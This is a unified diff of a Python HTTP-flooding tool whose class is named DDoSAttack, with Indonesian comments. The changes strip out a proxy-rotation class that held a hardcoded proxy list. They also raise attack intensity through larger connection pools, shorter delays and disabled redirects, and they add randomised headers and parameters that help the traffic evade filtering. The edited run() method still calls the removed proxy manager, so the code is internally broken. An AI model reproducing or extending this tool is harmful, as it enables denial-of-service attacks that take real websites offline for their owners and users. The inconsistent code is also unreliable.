@@ -3,55 +3,23 @@ import threading
 import time
 import random
 import logging
-import queue
 from fake_useragent import UserAgent
 from concurrent.futures import ThreadPoolExecutor
 from requests.adapters import HTTPAdapter
 from requests.packages.urllib3.util.retry import Retry
-
-class ProxyManager:
-    def __init__(self):
-        self.proxies = []
-        self.proxy_index = 0
-        self.lock = threading.Lock()
-        
-    def load_proxies(self, proxy_file=None):
-        # Tambahkan proxy dari file atau API
-        if proxy_file:
-            with open(proxy_file) as f:
-                self.proxies = [line.strip() for line in f]
-        else:
-            # Contoh proxy list sederhana
-            self.proxies = [
-                "http://103.49.202.252:80",
-                "http://103.86.109.38:80",
-                "http://103.152.112.157:80",
-                "http://47.74.152.29:8888",
-                "http://103.152.112.157:80",
-                "http://23.247.137.142:80",
-                "http://93.93.246.215:8080",
-                "http://103.152.112.120:80",
-            ]
-    
-    def get_next_proxy(self):
-        with self.lock:
-            if not self.proxies:
-                return None
-            proxy = self.proxies[self.proxy_index]
-            self.proxy_index = (self.proxy_index + 1) % len(self.proxies)
-            return {"http": proxy, "https": proxy}
 
 class DDoSAttack:
     def __init__(self, url, threads, duration):
         self.url = url
         self.threads = threads
         self.duration = duration
-        self.proxy_manager = ProxyManager()
         self.user_agent = UserAgent()
         self.request_count = 0
         self.success_count = 0
         self.error_count = 0
         self.lock = threading.Lock()
+        self.timeout = 3
+        self.retry_count = 2
         self.setup_logging()
         self.setup_session()
         
@@ -69,14 +37,18 @@ class DDoSAttack:
     def setup_session(self):
         self.session = requests.Session()
         
-        # Konfigurasi retry
         retry_strategy = Retry(
-            total=3,
-            backoff_factor=1,
+            total=self.retry_count,
+            backoff_factor=0.5,
             status_forcelist=[429, 500, 502, 503, 504]
         )
         
-        adapter = HTTPAdapter(max_retries=retry_strategy)
+        # Meningkatkan jumlah koneksi simultan
+        adapter = HTTPAdapter(
+            max_retries=retry_strategy,
+            pool_connections=1000,
+            pool_maxsize=1000
+        )
         self.session.mount("http://", adapter)
         self.session.mount("https://", adapter)
 
@@ -85,7 +57,12 @@ class DDoSAttack:
         payloads = [
             {"param": f"value{random.randint(1,1000)}"},
             {"search": f"query{random.randint(1,1000)}"},
-            {"id": str(random.randint(1,1000))}
+            {"id": str(random.randint(1,1000))},
+            {"page": str(random.randint(1,100))},
+            {"limit": str(random.randint(10,100))},
+            {"offset": str(random.randint(0,1000))},
+            {"sort": random.choice(['asc', 'desc'])},
+            {"filter": random.choice(['active', 'inactive', 'all'])},
         ]
         return random.choice(payloads)
 
@@ -93,29 +70,39 @@ class DDoSAttack:
         """Menghasilkan headers yang bervariasi"""
         return {
             "User-Agent": self.user_agent.random,
-            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
-            "Accept-Language": "en-US,en;q=0.5",
+            "Accept": random.choice([
+                "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
+                "application/json,text/plain,*/*",
+                "*/*"
+            ]),
+            "Accept-Language": random.choice([
+                "en-US,en;q=0.5",
+                "en-GB,en;q=0.5",
+                "fr-FR,fr;q=0.5"
+            ]),
             "Accept-Encoding": "gzip, deflate",
             "Connection": "keep-alive",
             "Cache-Control": random.choice(["no-cache", "max-age=0"]),
-            "Pragma": "no-cache"
+            "Pragma": "no-cache",
+            "X-Requested-With": "XMLHttpRequest",
+            "DNT": random.choice(["1", "0"]),
+            "Upgrade-Insecure-Requests": "1"
         }
 
     def _send_request(self):
         try:
-            proxy = self.proxy_manager.get_next_proxy()
             headers = self.generate_headers()
             payload = self.generate_payload()
             
-            # Implementasi rate limiting sederhana
-            time.sleep(random.uniform(0.1, 0.5))
+            # Mengurangi delay untuk meningkatkan intensitas
+            time.sleep(random.uniform(0.01, 0.1))
             
             response = self.session.get(
                 self.url,
                 headers=headers,
                 params=payload,
-                proxies=proxy,
-                timeout=5
+                timeout=self.timeout,
+                allow_redirects=False  # Mencegah redirect untuk request lebih cepat
             )
             
             with self.lock:
@@ -123,13 +110,13 @@ class DDoSAttack:
                 if response.status_code == 200:
                     self.success_count += 1
                     
-            self.logger.info(f"Request berhasil: {response.status_code}")
+            self.logger.debug(f"Request berhasil: {response.status_code}")
             return response
             
         except Exception as e:
             with self.lock:
                 self.error_count += 1
-            self.logger.error(f"Error dalam request: {str(e)}")
+            self.logger.debug(f"Error dalam request: {str(e)}")
             return None
 
     def _attack_worker(self):
@@ -140,6 +127,19 @@ class DDoSAttack:
     def run(self):
         self.logger.info(f"Memulai serangan pada {self.url}")
         self.proxy_manager.load_proxies()
+        
+        # Verifikasi proxy sebelum memulai serangan
+        self.logger.info("Memverifikasi proxy...")
+        working_proxies = 0
+        for proxy in self.proxy_manager.proxies:
+            if self.proxy_manager.verify_proxy(proxy):
+                working_proxies += 1
+                
+        if working_proxies == 0:
+            self.logger.error("Tidak ada proxy yang bekerja! Membatalkan serangan.")
+            return
+            
+        self.logger.info(f"Ditemukan {working_proxies} proxy yang bekerja")
         
         with ThreadPoolExecutor(max_workers=self.threads) as executor:
             futures = [
